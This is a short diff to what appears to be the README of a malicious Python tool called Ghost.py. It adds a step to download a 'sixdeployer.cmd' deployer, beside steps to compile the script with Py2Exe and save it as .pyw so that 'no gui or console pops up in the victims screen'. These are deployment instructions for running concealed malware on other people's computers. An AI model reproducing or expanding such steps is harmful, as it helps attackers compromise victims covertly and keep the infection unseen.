@@ -19,6 +19,8 @@
 ***Download The File Ghost.py or simply copy and paste the data into a code editor*** 
 
 ```
+- Download The Deployer ('sixdeployer.cmd')
+
 - Download A Py2Exe or any python to exe program,
 
 - Next, Use the PYW file format instead of PY file format so no gui or console pops up in the victims screen bitmap,
